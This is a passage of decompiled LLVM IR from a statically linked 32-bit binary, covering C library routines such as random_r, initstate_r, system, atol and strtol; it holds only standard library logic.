  %v7_8054318 = trunc i64 %v6_8054318 to i32
  %v2_805431e = ptrtoint i32* %stack_var_-20 to i32
  %v1_805432b24 = add i32 %v7_8054318, -1
  %v9_805432b25 = icmp slt i32 %v1_805432b24, 0
  store i32 %v1_805432b24, i32* @ebx, align 4
  %v1_805432c26 = icmp eq i1 %v9_805432b25, false
  br i1 %v1_805432c26, label %dec_label_pc_805431e, label %dec_label_pc_805432e

dec_label_pc_805431e:                             ; preds = %dec_label_pc_805430d, %dec_label_pc_805431e
  store i32 %v2_805431e, i32* %eax.global-to-local, align 4
  %v0_8054323 = load i32, i32* @esi, align 4
  %v2_8054324 = inttoptr i32 %v0_8054323 to i32*
  %v3_8054324 = call i32 @__GI_random_r(i32* %v2_8054324, i32 %v2_805431e)
  store i32 %v0_8054323, i32* %eax.global-to-local, align 4
  store i32 %v2_805431e, i32* %edx.global-to-local, align 4
  %v0_805432b.pre = load i32, i32* @ebx, align 4
  %v1_805432b = add i32 %v0_805432b.pre, -1
  %v9_805432b = icmp slt i32 %v1_805432b, 0
  store i32 %v1_805432b, i32* @ebx, align 4
  %v1_805432c = icmp eq i1 %v9_805432b, false
  br i1 %v1_805432c, label %dec_label_pc_805431e, label %dec_label_pc_805432e

dec_label_pc_805432e:                             ; preds = %dec_label_pc_805430d, %dec_label_pc_805431e, %dec_label_pc_80542c7
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054330

dec_label_pc_8054330:                             ; preds = %entry, %dec_label_pc_805432e
  %v0_8054333 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_805432e ]
  store i32 %v0_8054333, i32* %eax.global-to-local, align 4
  store i32 %v0_80542a7, i32* @ebx, align 4
  store i32 %v0_80542a6, i32* @esi, align 4
  store i32 %v0_80542a5, i32* @edi, align 4
  store i32 %v0_80542a4, i32* @ebp, align 4
  ret i32 %v0_8054333

; uselistorder directives
  uselistorder i32 %v0_8054333, { 1, 0 }
  uselistorder i32 %v1_805432b, { 1, 0 }
  uselistorder i32 %v0_805430d, { 1, 0 }
  uselistorder i32 %v0_8054308.pre, { 1, 0 }
  uselistorder i32 %v2_80542f8.v1_80542fc, { 1, 0 }
  uselistorder i32 %v0_80542de, { 1, 0 }
  uselistorder i32 %v0_80542cf, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054330, { 1, 0 }
  uselistorder label %dec_label_pc_805432e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805431e, { 1, 0 }
  uselistorder label %dec_label_pc_80542de, { 1, 0 }
  uselistorder label %dec_label_pc_80542c7, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_805433d = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_805435e, label %dec_label_pc_8054352

dec_label_pc_8054352:                             ; preds = %entry
  %v2_8054352 = icmp ult i32 %arg3, 256
  %v1_8054359 = select i1 %v2_8054352, i32 5, i32 4
  store i32 %v1_8054359, i32* @ebx, align 4
  br label %dec_label_pc_8054374

dec_label_pc_805435e:                             ; preds = %entry
  %v6_8054361 = icmp ugt i32 %arg3, 31
  br i1 %v6_8054361, label %dec_label_pc_805436c, label %dec_label_pc_8054363

dec_label_pc_8054363:                             ; preds = %dec_label_pc_805435e
  store i32 0, i32* @ebx, align 4
  %v6_8054368 = icmp ugt i32 %arg3, 7
  br i1 %v6_8054368, label %dec_label_pc_8054374, label %dec_label_pc_80543c4

dec_label_pc_805436c:                             ; preds = %dec_label_pc_805435e
  %v2_805436c = icmp ult i32 %arg3, 64
  %v1_8054371 = select i1 %v2_805436c, i32 3, i32 2
  store i32 %v1_8054371, i32* @ebx, align 4
  br label %dec_label_pc_8054374

dec_label_pc_8054374:                             ; preds = %dec_label_pc_8054363, %dec_label_pc_8054352, %dec_label_pc_805436c
  %v0_8054374 = phi i32 [ 0, %dec_label_pc_8054363 ], [ %v1_8054359, %dec_label_pc_8054352 ], [ %v1_8054371, %dec_label_pc_805436c ]
  %v1_8054374 = mul nuw nsw i32 %v0_8054374, 4
  %v2_8054374 = add i32 %v1_8054374, ptrtoint (i32* @global_var_805dcd4.985 to i32)
  %v3_8054374 = inttoptr i32 %v2_8054374 to i32*
  %v4_8054374 = load i32, i32* %v3_8054374, align 4
  store i32 %v4_8054374, i32* %eax.global-to-local, align 4
  %v1_805437b = add i32 %tmp7, 4
  store i32 %v1_805437b, i32* @esi, align 4
  %v2_805437e = add i32 %arg4, 16
  %v3_805437e = inttoptr i32 %v2_805437e to i32*
  store i32 %v4_8054374, i32* %v3_805437e, align 4
  %v0_8054381 = load i32, i32* @ebx, align 4
  %v1_8054381 = mul i32 %v0_8054381, 4
  %v2_8054381 = add i32 %v1_8054381, ptrtoint (i32* @global_var_805dcc0.986 to i32)
  %v3_8054381 = inttoptr i32 %v2_8054381 to i32*
  %v4_8054381 = load i32, i32* %v3_8054381, align 4
  store i32 %v4_8054381, i32* %edx.global-to-local, align 4
  %v0_8054388 = load i32, i32* @esi, align 4
  %v1_8054388 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054388 = mul i32 %v1_8054388, 4
  %v3_8054388 = add i32 %v2_8054388, %v0_8054388
  store i32 %v3_8054388, i32* %eax.global-to-local, align 4
  %v1_805438b = load i32, i32* @edi, align 4
  %v2_805438b = add i32 %v1_805438b, 12
  %v3_805438b = inttoptr i32 %v2_805438b to i32*
  store i32 %v0_8054381, i32* %v3_805438b, align 4
  %v0_805438e = load i32, i32* %edx.global-to-local, align 4
  %v1_805438e = load i32, i32* @edi, align 4
  %v2_805438e = add i32 %v1_805438e, 20
  %v3_805438e = inttoptr i32 %v2_805438e to i32*
  store i32 %v0_805438e, i32* %v3_805438e, align 4
  %v0_8054391 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054391 = load i32, i32* @edi, align 4
  %v2_8054391 = add i32 %v1_8054391, 24
  %v3_8054391 = inttoptr i32 %v2_8054391 to i32*
  store i32 %v0_8054391, i32* %v3_8054391, align 4
  %v0_8054394 = load i32, i32* @esi, align 4
  %v1_8054394 = load i32, i32* @edi, align 4
  %v2_8054394 = add i32 %v1_8054394, 8
  %v3_8054394 = inttoptr i32 %v2_8054394 to i32*
  store i32 %v0_8054394, i32* %v3_8054394, align 4
  %v0_8054397 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_805439c = sext i32 %arg1 to i64
  %v3_805439c = call i32 @srandom_r(i64 %v2_805439c, i32 %v0_8054397)
  %v0_80543a1 = load i32, i32* @ebp, align 4
  %v1_80543a1 = inttoptr i32 %v0_80543a1 to i32*
  store i32 0, i32* %v1_80543a1, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80543ac = load i32, i32* @ebx, align 4
  %v1_80543ac = icmp eq i32 %v0_80543ac, 0
  br i1 %v1_80543ac, label %dec_label_pc_80543dd, label %dec_label_pc_80543b0

dec_label_pc_80543b0:                             ; preds = %dec_label_pc_8054374
  %v0_80543b0 = load i32, i32* @edi, align 4
  %v1_80543b0 = add i32 %v0_80543b0, 4
  %v2_80543b0 = inttoptr i32 %v1_80543b0 to i32*
  %v3_80543b0 = load i32, i32* %v2_80543b0, align 4
  %v1_80543b3 = load i32, i32* @esi, align 4
  %v2_80543b3 = sub i32 %v3_80543b0, %v1_80543b3
  %v2_80543b5 = sdiv i32 %v2_80543b3, 4
  %v3_80543b8 = mul i32 %v2_80543b5, 5
  %v2_80543bb = add i32 %v3_80543b8, %v0_80543ac
  %v1_80543bd = load i32, i32* @ebp, align 4
  %v2_80543bd = inttoptr i32 %v1_80543bd to i32*
  store i32 %v2_80543bb, i32* %v2_80543bd, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80543dd

dec_label_pc_80543c4:                             ; preds = %dec_label_pc_8054363
  %v1_80543c4 = call i32 @__errno_location(i32 %v0_805433d)
  store i32 %v1_80543c4, i32* %eax.global-to-local, align 4
  %v1_80543c9 = inttoptr i32 %v1_80543c4 to i32*
  store i32 22, i32* %v1_80543c9, align 4
  %v0_80543cf = load i32, i32* %stack_var_-36, align 4
  %v1_80543cf = call i32 @__errno_location(i32 %v0_80543cf)
  %v1_80543d4 = inttoptr i32 %v1_80543cf to i32*
  store i32 22, i32* %v1_80543d4, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80543dd

dec_label_pc_80543dd:                             ; preds = %dec_label_pc_8054374, %dec_label_pc_80543b0, %dec_label_pc_80543c4
  %v0_80543e4 = phi i32 [ 0, %dec_label_pc_8054374 ], [ 0, %dec_label_pc_80543b0 ], [ -1, %dec_label_pc_80543c4 ]
  ret i32 %v0_80543e4

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80543dd, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054374, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_80543e8 = load i32, i32* @ebx, align 4
  %v4_80543f1 = icmp eq i32 %arg1, 0
  br i1 %v4_80543f1, label %dec_label_pc_8054514, label %dec_label_pc_80543fc

dec_label_pc_80543fc:                             ; preds = %entry
  %v2_8054402 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8054411 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_8054420 = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_8054429 = call i32 @__vfork(i32 %v2_8054420)
  store i32 %v1_8054429, i32* @ebx, align 4
  %v2_8054433 = icmp slt i32 %v1_8054429, 0
  %v2_8054436 = icmp eq i1 %v2_8054433, false
  br i1 %v2_8054436, label %dec_label_pc_8054467, label %dec_label_pc_8054438

dec_label_pc_8054438:                             ; preds = %dec_label_pc_80543fc
  %v2_8054440 = call i32 @__bsd_signal(i32 3, i32 %v2_8054402)
  store i32 %v2_8054402, i32* @edx, align 4
  %v2_805444d = call i32 @__bsd_signal(i32 2, i32 %v2_8054411)
  store i32 2, i32* @ebx, align 4
  %v2_805445a = call i32 @__bsd_signal(i32 17, i32 %v2_8054420)
  br label %dec_label_pc_8054511

dec_label_pc_8054467:                             ; preds = %dec_label_pc_80543fc
  %v1_8054433 = icmp eq i32 %v1_8054429, 0
  %v1_8054467 = icmp eq i1 %v1_8054433, false
  br i1 %v1_8054467, label %dec_label_pc_80544b3, label %dec_label_pc_8054469

dec_label_pc_8054469:                             ; preds = %dec_label_pc_8054467
  %v2_805446f = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_805447a = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_8054485 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_80544a4 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805dceb.989 to i32), i32 ptrtoint ([3 x i8]* @global_var_805dcf0.988 to i32), i32 ptrtoint ([3 x i8]* @global_var_805dce8.987 to i32), i32 %arg1, i32 0)
  %v1_80544ae = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_80544b3:                             ; preds = %dec_label_pc_8054467
  %v2_80544b9 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_80544c4 = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_80544c9 = ptrtoint i32* %stack_var_-8 to i32
  %v0_80544d2 = load i32, i32* @ebx, align 4
  %v7_80544d3 = call i32 @wait4(i32 %v0_80544d2, i32 %v2_80544c9, i32 0, i32 0)
  %v8_80544db = icmp eq i32 %v7_80544d3, -1
  %v1_80544dc = icmp eq i1 %v8_80544db, false
  br i1 %v1_80544dc, label %dec_label_pc_80544e6, label %dec_label_pc_80544de

dec_label_pc_80544de:                             ; preds = %dec_label_pc_80544b3
  store i32 -1, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80544e6

dec_label_pc_80544e6:                             ; preds = %dec_label_pc_80544b3, %dec_label_pc_80544de
  %v2_80544ee = call i32 @__bsd_signal(i32 3, i32 %v2_8054402)
  store i32 %v2_8054402, i32* @ebx, align 4
  %v2_80544fb = call i32 @__bsd_signal(i32 2, i32 %v2_8054411)
  store i32 %v2_8054411, i32* @edx, align 4
  %v2_8054508 = call i32 @__bsd_signal(i32 17, i32 %v2_8054420)
  %v3_805450d = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8054511

dec_label_pc_8054511:                             ; preds = %dec_label_pc_8054438, %dec_label_pc_80544e6
  %storemerge = phi i32 [ -1, %dec_label_pc_8054438 ], [ %v3_805450d, %dec_label_pc_80544e6 ]
  br label %dec_label_pc_8054514

dec_label_pc_8054514:                             ; preds = %entry, %dec_label_pc_8054511
  %v0_8054518 = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_8054511 ]
  store i32 %v0_80543e8, i32* @ebx, align 4
  ret i32 %v0_8054518

; uselistorder directives
  uselistorder i32 %v1_8054429, { 1, 2, 0 }
  uselistorder i32 %v2_8054420, { 1, 0, 2 }
  uselistorder i32 %v2_8054411, { 0, 2, 1 }
  uselistorder i32 %v2_8054402, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 (i32)* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_8054514, { 1, 0 }
  uselistorder label %dec_label_pc_8054511, { 1, 0 }
  uselistorder label %dec_label_pc_80544e6, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8054527 = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_8054527
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8054541 = inttoptr i32 %arg1 to i8*
  %v5_8054541 = call i32 @_stdlib_strto_l(i8* %v4_8054541, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8054541
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_805454f = load i32, i32* @ebx, align 4
  store i32 %v0_805454f, i32* %stack_var_-16, align 4
  %v0_8054553 = load i32, i32* @global_var_805f61c, align 4
  %v4_8054559 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054559, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_8054559, i32* %ebx.global-to-local, align 4
  %v2_805456641 = load i8, i8* %arg1, align 1
  %v3_805456642 = sext i8 %v2_805456641 to i32
  store i32 %v3_805456642, i32* %eax.global-to-local, align 4
  %v2_805456943 = mul nsw i32 %v3_805456642, 2
  %v3_805456944 = add i32 %v2_805456943, %v0_8054553
  %v4_805456945 = inttoptr i32 %v3_805456944 to i8*
  %v5_805456946 = load i8, i8* %v4_805456945, align 1
  %v6_805456947 = and i8 %v5_805456946, 32
  %v7_805456948 = icmp eq i8 %v6_805456947, 0
  %v1_805456d49 = icmp eq i1 %v7_805456948, false
  br i1 %v1_805456d49, label %dec_label_pc_8054565, label %dec_label_pc_805456f

dec_label_pc_8054565:                             ; preds = %entry, %dec_label_pc_8054565
  %v0_805456550 = phi i32 [ %v1_8054565, %dec_label_pc_8054565 ], [ %v4_8054559, %entry ]
  %v1_8054565 = add i32 %v0_805456550, 1
  store i32 %v1_8054565, i32* %ebx.global-to-local, align 4
  %v1_8054566 = inttoptr i32 %v1_8054565 to i8*
  %v2_8054566 = load i8, i8* %v1_8054566, align 1
  %v3_8054566 = sext i8 %v2_8054566 to i32
  store i32 %v3_8054566, i32* %eax.global-to-local, align 4
  %v2_8054569 = mul nsw i32 %v3_8054566, 2
  %v3_8054569 = add i32 %v2_8054569, %v0_8054553
  %v4_8054569 = inttoptr i32 %v3_8054569 to i8*
  %v5_8054569 = load i8, i8* %v4_8054569, align 1
  %v6_8054569 = and i8 %v5_8054569, 32
  %v7_8054569 = icmp eq i8 %v6_8054569, 0
  %v1_805456d = icmp eq i1 %v7_8054569, false
  br i1 %v1_805456d, label %dec_label_pc_8054565, label %dec_label_pc_805456f

dec_label_pc_805456f:                             ; preds = %dec_label_pc_8054565, %entry
  %v0_8054565.lcssa = phi i32 [ %v4_8054559, %entry ], [ %v1_8054565, %dec_label_pc_8054565 ]
  %v2_8054566.lcssa = phi i8 [ %v2_805456641, %entry ], [ %v2_8054566, %dec_label_pc_8054565 ]
  %v3_8054566.lcssa = phi i32 [ %v3_805456642, %entry ], [ %v3_8054566, %dec_label_pc_8054565 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_805456f = icmp eq i8 %v2_8054566.lcssa, 43
  br i1 %v9_805456f, label %dec_label_pc_8054584, label %dec_label_pc_8054574

dec_label_pc_8054574:                             ; preds = %dec_label_pc_805456f
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_8054576 = icmp eq i8 %v2_8054566.lcssa, 45
  %v1_8054579 = icmp eq i1 %v9_8054576, false
  br i1 %v1_8054579, label %dec_label_pc_8054585, label %dec_label_pc_8054584

dec_label_pc_8054584:                             ; preds = %dec_label_pc_805456f, %dec_label_pc_8054574
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8054574 ], [ 0, %dec_label_pc_805456f ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_8054584 = add i32 %v0_8054565.lcssa, 1
  store i32 %v1_8054584, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054585

dec_label_pc_8054585:                             ; preds = %dec_label_pc_8054574, %dec_label_pc_8054584
  %v0_8054597 = phi i32 [ %v0_8054565.lcssa, %dec_label_pc_8054574 ], [ %v1_8054584, %dec_label_pc_8054584 ]
  %v1_8054587 = and i32 %arg3, -17
  %v2_8054587 = icmp eq i32 %v1_8054587, 0
  %v1_805458d = icmp eq i1 %v2_8054587, false
  br i1 %v1_805458d, label %dec_label_pc_80545b3, label %dec_label_pc_805458f

dec_label_pc_805458f:                             ; preds = %dec_label_pc_8054585
  %v1_805458f = add i32 %arg3, 10
  store i32 %v1_805458f, i32* %esi.global-to-local, align 4
  %v1_8054592 = inttoptr i32 %v0_8054597 to i8*
  %v2_8054592 = load i8, i8* %v1_8054592, align 1
  %v8_8054592 = icmp eq i8 %v2_8054592, 48
  %v1_8054595 = icmp eq i1 %v8_8054592, false
  br i1 %v1_8054595, label %dec_label_pc_80545a9, label %dec_label_pc_8054597

dec_label_pc_8054597:                             ; preds = %dec_label_pc_805458f
  %v1_8054597 = add i32 %v0_8054597, 1
  store i32 %v1_8054597, i32* %ebx.global-to-local, align 4
  %v1_8054598 = add i32 %arg3, 8
  store i32 %v1_8054598, i32* %esi.global-to-local, align 4
  %v1_805459d = inttoptr i32 %v1_8054597 to i8*
  %v2_805459d = load i8, i8* %v1_805459d, align 1
  %v3_805459d = zext i8 %v2_805459d to i32
  %v5_805459d = and i32 %v3_8054566.lcssa, -256
  %v6_805459d = or i32 %v5_805459d, %v3_805459d
  %v1_805459f = or i32 %v6_805459d, 32
  %v3_805459f = trunc i32 %v1_805459f to i8
  store i32 %v1_805459f, i32* %eax.global-to-local, align 4
  %v10_80545a2 = icmp eq i8 %v3_805459f, 120
  %v1_80545a4 = icmp eq i1 %v10_80545a2, false
  br i1 %v1_80545a4, label %dec_label_pc_80545a9, label %dec_label_pc_80545a6

dec_label_pc_80545a6:                             ; preds = %dec_label_pc_8054597
  %v2_80545a6 = mul i32 %v1_8054598, 2
  store i32 %v2_80545a6, i32* %esi.global-to-local, align 4
  %v1_80545a8 = add i32 %v0_8054597, 2
  store i32 %v1_80545a8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80545a9

dec_label_pc_80545a9:                             ; preds = %dec_label_pc_8054597, %dec_label_pc_805458f, %dec_label_pc_80545a6
  %v0_80545d212 = phi i32 [ %v1_8054597, %dec_label_pc_8054597 ], [ %v0_8054597, %dec_label_pc_805458f ], [ %v1_80545a8, %dec_label_pc_80545a6 ]
  %v0_805462920 = phi i32 [ %v1_8054597, %dec_label_pc_8054597 ], [ %v4_8054559, %dec_label_pc_805458f ], [ %v1_8054597, %dec_label_pc_80545a6 ]
  %v0_80545a9 = phi i32 [ %v1_8054598, %dec_label_pc_8054597 ], [ %v1_805458f, %dec_label_pc_805458f ], [ %v2_80545a6, %dec_label_pc_80545a6 ]
  %v7_80545ac = icmp sgt i32 %v0_80545a9, 16
  br i1 %v7_80545ac, label %dec_label_pc_80545ae, label %dec_label_pc_80545b3

dec_label_pc_80545ae:                             ; preds = %dec_label_pc_80545a9
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80545b3

dec_label_pc_80545b3:                             ; preds = %dec_label_pc_80545a9, %dec_label_pc_8054585, %dec_label_pc_80545ae
  %v0_805462921 = phi i32 [ %v0_805462920, %dec_label_pc_80545a9 ], [ %v4_8054559, %dec_label_pc_8054585 ], [ %v0_805462920, %dec_label_pc_80545ae ]
  %v0_80545d213 = phi i32 [ %v0_80545d212, %dec_label_pc_80545a9 ], [ %v0_8054597, %dec_label_pc_8054585 ], [ %v0_80545d212, %dec_label_pc_80545ae ]
  %v0_80545c2 = phi i32 [ %v0_80545a9, %dec_label_pc_80545a9 ], [ %arg3, %dec_label_pc_8054585 ], [ 16, %dec_label_pc_80545ae ]
  %v1_80545b3 = add i32 %v0_80545c2, -2
  store i32 %v1_80545b3, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v6_80545bb = icmp ugt i32 %v1_80545b3, 34
  br i1 %v6_80545bb, label %dec_label_pc_805461e, label %dec_label_pc_80545bd

dec_label_pc_80545bd:                             ; preds = %dec_label_pc_80545b3
  %div = udiv i32 -1, %v0_80545c2
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_80545c2
  %v1_80545c4 = trunc i32 %tmp38 to i8
  store i32 0, i32* @edx, align 4
  %v4_80545fe = urem i32 %arg4, 256
  br label %dec_label_pc_80545d2

dec_label_pc_80545d0:                             ; preds = %dec_label_pc_8054614, %dec_label_pc_80545fe
  %v4_80545d2.pre = phi i32 [ %v1_80545e8, %dec_label_pc_8054614 ], [ %v4_80545d2.pre.pre, %dec_label_pc_80545fe ]
  %v0_80545d0 = phi i32 [ %v1_80545ef, %dec_label_pc_8054614 ], [ %v0_80545d0.pre, %dec_label_pc_80545fe ]
  br label %dec_label_pc_80545d2

dec_label_pc_80545d2:                             ; preds = %dec_label_pc_80545bd, %dec_label_pc_80545d0
  %v0_805462919 = phi i32 [ %v0_805462921, %dec_label_pc_80545bd ], [ %v0_80545d0, %dec_label_pc_80545d0 ]
  %v0_80545ef = phi i32 [ %v0_80545d213, %dec_label_pc_80545bd ], [ %v0_80545d0, %dec_label_pc_80545d0 ]
  %v4_80545d2 = phi i32 [ %div, %dec_label_pc_80545bd ], [ %v4_80545d2.pre, %dec_label_pc_80545d0 ]
  %v1_80545d2 = inttoptr i32 %v0_80545ef to i8*
  %v2_80545d2 = load i8, i8* %v1_80545d2, align 1
  %v3_80545d2 = zext i8 %v2_80545d2 to i32
  %v5_80545d2 = and i32 %v4_80545d2, -256
  %v6_80545d2 = or i32 %v3_80545d2, %v5_80545d2
  store i32 %v6_80545d2, i32* %eax.global-to-local, align 4
  %v1_80545d4 = add i32 %v6_80545d2, -48
  store i32 %v1_80545d4, i32* @ecx, align 4
  %v1_80545d7 = trunc i32 %v1_80545d4 to i8
  %tmp55 = icmp ult i8 %v1_80545d7, 10
  br i1 %tmp55, label %dec_label_pc_80545e8, label %dec_label_pc_80545dc

dec_label_pc_80545dc:                             ; preds = %dec_label_pc_80545d2
  %v1_80545dc = or i32 %v6_80545d2, 32
  %v3_80545dc = trunc i32 %v1_80545dc to i8
  store i32 %v1_80545dc, i32* %eax.global-to-local, align 4
  %v1_80545df = and i32 %v1_80545d4, -256
  %v2_80545df = or i32 %v1_80545df, 40
  store i32 %v2_80545df, i32* @ecx, align 4
  %tmp56 = icmp ult i8 %v3_80545dc, 97
  br i1 %tmp56, label %dec_label_pc_80545e8, label %dec_label_pc_80545e5

dec_label_pc_80545e5:                             ; preds = %dec_label_pc_80545dc
  %v1_80545e5 = add i32 %v1_80545dc, -87
  store i32 %v1_80545e5, i32* @ecx, align 4
  br label %dec_label_pc_80545e8

dec_label_pc_80545e8:                             ; preds = %dec_label_pc_80545dc, %dec_label_pc_80545d2, %dec_label_pc_80545e5
  %v0_8054617 = phi i32 [ %v2_80545df, %dec_label_pc_80545dc ], [ %v1_80545d4, %dec_label_pc_80545d2 ], [ %v1_80545e5, %dec_label_pc_80545e5 ]
  %v1_80545e8 = urem i32 %v0_8054617, 256
  store i32 %v1_80545e8, i32* %eax.global-to-local, align 4
  %v1_80545eb = load i32, i32* %esi.global-to-local, align 4
  %v2_80545eb = sub i32 %v1_80545e8, %v1_80545eb
  %v10_80545eb = and i32 %v2_80545eb, %v1_80545eb
  %v11_80545eb = icmp slt i32 %v10_80545eb, 0
  %v13_80545eb = icmp slt i32 %v2_80545eb, 0
  %v2_80545ed = icmp eq i1 %v13_80545eb, %v11_80545eb
  br i1 %v2_80545ed, label %dec_label_pc_805461e, label %dec_label_pc_80545ef

dec_label_pc_80545ef:                             ; preds = %dec_label_pc_80545e8
  %v1_80545ef = add i32 %v0_80545ef, 1
  store i32 %v1_80545ef, i32* %ebx.global-to-local, align 4
  %v0_80545f0 = load i32, i32* @edx, align 4
  %tmp57 = icmp ugt i32 %v0_80545f0, %div
  br i1 %tmp57, label %dec_label_pc_80545fe, label %dec_label_pc_80545f6

dec_label_pc_80545f6:                             ; preds = %dec_label_pc_80545ef
  %v15_80545f0 = icmp eq i32 %v0_80545f0, %div
  %v1_80545f6 = icmp eq i1 %v15_80545f0, false
  br i1 %v1_80545f6, label %dec_label_pc_8054614, label %dec_label_pc_80545f8

dec_label_pc_80545f8:                             ; preds = %dec_label_pc_80545f6
  %v1_80545f8 = trunc i32 %v0_8054617 to i8
  %tmp58 = icmp ugt i8 %v1_80545f8, %v1_80545c4
  br i1 %tmp58, label %dec_label_pc_80545fe, label %dec_label_pc_8054614

dec_label_pc_80545fe:                             ; preds = %dec_label_pc_80545f8, %dec_label_pc_80545ef
  store i32 %v4_80545fe, i32* %eax.global-to-local, align 4
  %v0_8054602 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054602 = and i32 %v0_8054602, %v4_80545fe
  store i32 %v2_8054602, i32* %ebp.global-to-local, align 4
  %v1_8054604 = call i32 @__errno_location(i32 %div)
  store i32 %v1_8054604, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v1_805460c = inttoptr i32 %v1_8054604 to i32*
  store i32 34, i32* %v1_805460c, align 4
  %v0_80545d0.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_80545d2.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80545d0

dec_label_pc_8054614:                             ; preds = %dec_label_pc_80545f8, %dec_label_pc_80545f6
  %v4_8054614 = mul i32 %v0_80545f0, %v1_80545eb
  store i32 %v1_80545e8, i32* %eax.global-to-local, align 4
  %v2_805461a = add i32 %v4_8054614, %v1_80545e8
  store i32 %v2_805461a, i32* @edx, align 4
  br label %dec_label_pc_80545d0

dec_label_pc_805461e:                             ; preds = %dec_label_pc_80545e8, %dec_label_pc_80545b3
  %v0_8054629 = phi i32 [ %v0_805462921, %dec_label_pc_80545b3 ], [ %v0_805462919, %dec_label_pc_80545e8 ]
  %stack_var_-24.0 = phi i32 [ %tmp27, %dec_label_pc_80545b3 ], [ %div, %dec_label_pc_80545e8 ]
  %v4_805461e = icmp eq i32 %arg2, 0
  br i1 %v4_805461e, label %dec_label_pc_805462b, label %dec_label_pc_8054625

dec_label_pc_8054625:                             ; preds = %dec_label_pc_805461e
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8054629 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8054629, i32* %v2_8054629, align 4
  br label %dec_label_pc_805462b

dec_label_pc_805462b:                             ; preds = %dec_label_pc_805461e, %dec_label_pc_8054625
  %v0_805462b = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_805462b, i32* %eax.global-to-local, align 4
  %v1_805462d = trunc i32 %v0_805462b to i8
  %v6_805462d = icmp eq i8 %v1_805462d, 0
  %v2_805462f = zext i1 %v6_805462d to i32
